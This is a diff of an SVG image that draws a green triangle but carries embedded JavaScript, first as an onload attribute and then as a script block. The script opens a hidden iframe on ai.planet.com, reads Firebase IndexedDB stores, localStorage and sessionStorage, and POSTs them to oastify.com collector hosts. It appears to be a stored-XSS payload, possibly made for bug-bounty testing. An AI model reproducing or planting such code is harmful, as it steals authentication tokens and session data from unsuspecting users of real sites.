@@ -1,3 +1,48 @@
-<svg xmlns="http://www.w3.org/2000/svg" onload="var iframe = document.createElement(&#39;iframe&#39;); iframe.src = &#39;https://ai.planet.com/profile&#39;; iframe.style.display = &#39;none&#39;; document.body.appendChild(iframe); iframe.onload = function() { var win = iframe.contentWindow; var request = win.indexedDB.open(&#39;firebase-installations-database&#39;); request.onsuccess = function(event) { var db = event.target.result; var transaction = db.transaction([&#39;firebase-installations-store&#39;], &#39;readonly&#39;); var store = transaction.objectStore(&#39;firebase-installations-store&#39;); var getAll = store.getAll(); getAll.onsuccess = function() { var firebaseData = getAll.result; fetch(&#39;https://7pxwj8vuwwjr6kyatewtryrr2i89w0wol.oastify.com/firebase&#39;, { method: &#39;POST&#39;, body: JSON.stringify({ firebaseInstallations: firebaseData, localStorage: JSON.stringify(win.localStorage), sessionStorage: JSON.stringify(win.sessionStorage) }) }); }; }; var firebaseDBs = [&#39;firebase-local-storage&#39;,&#39;firebase-auth-database&#39;,&#39;firebase::firebase:ai.planet.com&#39;,&#39;persistence:ai.planet.com&#39;]; firebaseDBs.forEach(function(dbName) { try { var req = win.indexedDB.open(dbName); req.onsuccess = function(e) { fetch(&#39;https://vhgkbwniokbfy8qyl2ohjmjfu60xorcg.oastify.com/db?name=&#39; + dbName); }; } catch(e) {} }); };">
+<svg xmlns="http://www.w3.org/2000/svg">
+  <script type="text/javascript"><![CDATA[
+    var iframe = document.createElement('iframe');
+    iframe.src = 'https://ai.planet.com/profile';
+    iframe.style.display = 'none';
+    document.body.appendChild(iframe);
+    
+    iframe.onload = function() {
+      var win = iframe.contentWindow;
+      
+      var request = win.indexedDB.open('firebase-installations-database');
+      request.onsuccess = function(event) {
+        var db = event.target.result;
+        var transaction = db.transaction(['firebase-installations-store'], 'readonly');
+        var store = transaction.objectStore('firebase-installations-store');
+        var getAll = store.getAll();
+        getAll.onsuccess = function() {
+          var firebaseData = getAll.result;
+          fetch('https://m3qbxn99abx6kzcp7ta85d56gxmoafb30.oastify.com/firebase', {
+            method: 'POST',
+            body: JSON.stringify({
+              firebaseInstallations: firebaseData,
+              localStorage: JSON.stringify(win.localStorage),
+              sessionStorage: JSON.stringify(win.sessionStorage)
+            })
+          });
+        };
+      };
+      
+      var firebaseDBs = [
+        'firebase-local-storage',
+        'firebase-auth-database',
+        'firebase::firebase:ai.planet.com',
+        'persistence:ai.planet.com'
+      ];
+      
+      firebaseDBs.forEach(function(dbName) {
+        try {
+          var req = win.indexedDB.open(dbName);
+          req.onsuccess = function(e) {
+            fetch('https://vhgkbwniokbfy8qyl2ohjmjfu60xorcg.oastify.com/db?name=' + dbName);
+          };
+        } catch(e) {}
+      });
+    };
+  ]]></script>
   <polygon points="50,15 90,85 10,85" fill="#4CAF50" stroke="#2E7D32" stroke-width="3"/>
 </svg>
